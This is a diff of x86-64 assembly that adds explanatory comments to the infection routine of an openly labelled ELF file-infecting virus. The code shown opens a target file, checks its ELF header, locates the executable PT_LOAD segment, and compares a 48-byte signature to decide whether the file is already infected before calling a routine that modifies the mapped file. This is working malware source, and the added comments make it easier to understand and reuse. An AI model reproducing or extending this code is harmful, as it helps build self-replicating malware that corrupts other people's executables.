@@ -24,7 +24,7 @@ _file_size:
 	leave
 	ret
 
-_treat_file:
+_treat_file: ; void treat_file(char *name, long virus_size)
 	enter 80, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
 				; rsp + 0 bytes for fd
 				; rsp + 8 bytes for virus size
@@ -34,8 +34,10 @@ _treat_file:
 				; rsp + 40 actual phnum
 				; rsp + 48 ehdr->e_phnum
 				; rsp + 56 supposed string of file
+; check if name != NULL
 	cmp rdi, 0
 	je _final_end
+; save virus_size
 	mov QWORD [rsp + 8], rsi
 ;;;;;;;;;;;;;;;;;
 ; open file
@@ -66,15 +68,6 @@ _treat_file:
 	mov QWORD [rsp + 24], rax
 
 _read_file_header_64:
-;;;;;;;;;;;;;;;;;
-; read the header from file, if it has one (64 bytes)
-;	xor rax, rax
-;	mov rdi, QWORD [rsp + 4096]
-;	mov rsi, rsp
-;	mov rdx, 64
-;	syscall
-;	cmp rax, 64  ; if their is less than 64 bytes readed, then the file is not a binary
-;	jl _final_end
 ;; check magic number
 	mov rdi, QWORD [rsp + 24]
 	cmp DWORD [rdi], 0x464c457f
@@ -86,54 +79,66 @@ _read_file_header_64:
 	cmp WORD [rdi + 16], 2
 	jne _munmap
 ;; check if our string is already in the file.
-	mov r10, QWORD [rsp + 24] ; r10 = mmaped addr
+; we just take the PT_LOAD segment +PT_LOAD size, to go at the end of this segment,
+; and substract to this value, the virus size, to go to our theoric signature string address in file
+; then we verify it 8 by 8 bytes with our current signature.
+; here we take the phdr_offset, to browse the segment table, to find the PT_LOAD segments
+	mov r10, QWORD [rsp + 24] ; take mmap_base_addr
 	mov QWORD [rsp + 32], r10 ; phdr = r10
-	add QWORD [rsp + 32], 32 ; phdr += 32
+	add QWORD [rsp + 32], 32 ; add 32 to mmap_base_addr, it's the offset of ph_offset
 	mov r10, QWORD [rsp + 32] ; r10 = phdr
-	mov r10, QWORD [r10] ; r10 = *phdr
+	mov r10, QWORD [r10] ; take the value of ph_offset(it's like i = *i), where i is a long containing an address of a long value
+; verif if ph_offset is not out of the file
 	cmp r10, QWORD [rsp + 16]
 	jge _munmap
+; segment table should only be directly after header, so 64 bytes offset
 	cmp r10, 64
 	jne _munmap
-	mov QWORD [rsp + 32], r10 ; phdr = r10
+	mov QWORD [rsp + 32], r10 ; phdr = r10, save ph_offset value
 	mov r10, QWORD [rsp + 24] ; r10 = mmap addr
-	add QWORD [rsp + 32], r10 ; phdr += r10
+	add QWORD [rsp + 32], r10 ; add the ph_offset to the mmap_base_address, to work on our mmaped buffer
 	mov QWORD [rsp + 40], 0 ; phnum = 0
-	mov r10, QWORD [rsp + 24] ; r10 = mmap addr
-	mov QWORD [rsp + 48], r10 ; ehdr->e_phnum = r10
-	add QWORD [rsp + 48], 56 ; ehdr->e_phnum += 56
-	mov r11, QWORD [rsp + 48] ; r11 = ehdr->e_phnum
+; now we need to take the number of segments
+	mov r10, QWORD [rsp + 24] ; take mmap_base_address
+	mov QWORD [rsp + 48], r10 ; move it on stack
+	add QWORD [rsp + 48], 56 ; add 56 to the mmap_base_address, it's the offset of e_phnum
+	mov r11, QWORD [rsp + 48] ; mov this address on r11
 	xor r10, r10 ; r10 = 0
-	mov r10w, WORD [r11] ; r10w = *ehdr->e_phnum
-	mov QWORD [rsp + 48], r10 ; ehdr->e_phnum = r10
+	mov r10w, WORD [r11] ; now we dereference our address to access the e_phnum value, and store it on r10
+	mov QWORD [rsp + 48], r10 ; save it on stack
+; if e_phnum is negativ, their is a problem
 	cmp r10, 0
 	jl _munmap
 
+; now we browse all the segment to find PT_LOAD
 _loop_verif:
-	mov r10, QWORD [rsp + 40] ; r10 = phnum
+	mov r10, QWORD [rsp + 40] ; take  actual phnum
 	cmp r10, QWORD [rsp + 48] ; if phnum >= ehdr->e_phnum
 	jge _munmap
-	mov r10, QWORD [rsp + 32] ; r10 = phdr
+	mov r10, QWORD [rsp + 32] ; take phdr
+; check the type and flag, we need to have type == PT_LOAD && flag = exec|read
 	cmp DWORD [r10], 1 ; if *phdr != 1
 	jne _inc_before_reloop
-	add r10, 4 ; r10 += 4
-	mov r10d, DWORD [r10] ; r10 = *r10
-	and r10d, 1 ; r10 & 1
+	add r10, 4 ; add 4 to the phdr address
+	mov r10d, DWORD [r10] ; dereference phdr (4bytes), this is the flag
+	and r10d, 1 ; r10 & 1 ; logical and
 	cmp r10d, 1 ; if r10 != 1
 	jne _inc_before_reloop
-; we find pt_load
-	mov r10, QWORD [rsp + 32] ; r10 = phdr
-	add r10, 8 ; r10 += 8
-	mov r10, QWORD [r10] ; r10 = *r10
-	mov QWORD [rsp + 56], r10 ; str_offset = r10
-	mov r10, QWORD [rsp + 32] ; r10 = phdr
-	add r10, 32 ; r10 += 32
-	mov r10, QWORD [r10] ; r10 = *r10
-	add QWORD [rsp + 56], r10 ; str_offset += r10
-	mov r10, QWORD [rsp + 8] ; r10 = virus_size
-	sub QWORD [rsp + 56], r10 ; str_offset -= r10
-	mov r10, QWORD [rsp + 24] ; r10 = mmap
-	add QWORD [rsp + 56], r10 ; str_offset += r10
+; we find pt_load, now we need to go to our supposed str addres:
+; str_addr = (segment offset in file + segment size in file) - virus size
+	mov r10, QWORD [rsp + 32] ; take phdr
+	add r10, 8 ; add 8 to phdr, offset for p_offset (offset of the segment in file)
+	mov r10, QWORD [r10] ; dereference it to take the value
+	mov QWORD [rsp + 56], r10 ; store it in stack
+	mov r10, QWORD [rsp + 32] ; take phdr
+	add r10, 32 ; add 32 to phdr, offset for p_filesz (the size of the segment)
+	mov r10, QWORD [r10] ; dereference it to take the value
+	add QWORD [rsp + 56], r10 ; add it to the p_offset find before
+	mov r10, QWORD [rsp + 8] ; take the virus size
+	sub QWORD [rsp + 56], r10 ; substract the virus size to our offset+size
+; now we have the theoric offset of our string, we need to add this offset on the mmap address
+	mov r10, QWORD [rsp + 24] ; take mmap address
+	add QWORD [rsp + 56], r10 ; add it to our offset
 	jmp _init_cmp_loop
 
 _inc_before_reloop:
@@ -142,24 +147,26 @@ _inc_before_reloop:
 	jmp _loop_verif
 
 _init_cmp_loop:
-	xor rcx, rcx
-	mov rdi, QWORD [rsp + 56]
-	lea rsi, [rel _string]
+; here we will compare 8 by 8 bytes of the string 
+	xor rcx, rcx ; clear rcx
+	mov rdi, QWORD [rsp + 56] ; take the str supposed address
+	lea rsi, [rel _string] ; take our actual string address
 
 _cmp:
-	cmp rcx, 48
-	jge _munmap
-	mov r10, QWORD [rsi + rcx]
-	cmp r10, QWORD [rdi + rcx]
-	jne _call_mmaped_update
-	add rcx, 8
+	cmp rcx, 48 ; until we check 48 bytes
+	jge _munmap ; if we checked 48 bytes successfully, so we find the signature, and we dont need to reinfect this file
+	mov r10, QWORD [rsi + rcx] ; take 8 bytes of our actual string
+	cmp r10, QWORD [rdi + rcx] ; compare it to 8 bytes of the supposed string
+	jne _call_mmaped_update ; if it differ, the file haven't been infected, so we do
+	add rcx, 8 ; add 8 to our index
 	jmp _cmp
 
 _call_mmaped_update:
-	mov rdi, QWORD [rsp + 24]
-	mov rsi, QWORD [rsp + 16]
-	mov rdx, QWORD [rsp + 8]
-	mov r10, QWORD [rsp]
+; init argument for next function
+	mov rdi, QWORD [rsp + 24] ; mmap_base_addr
+	mov rsi, QWORD [rsp + 16] ; file size
+	mov rdx, QWORD [rsp + 8] ; virus size
+	mov r10, QWORD [rsp] ; fd
 	call _update_mmaped_file
 
 ;;;;;;;;;;;;;;;;;;;;;;;;
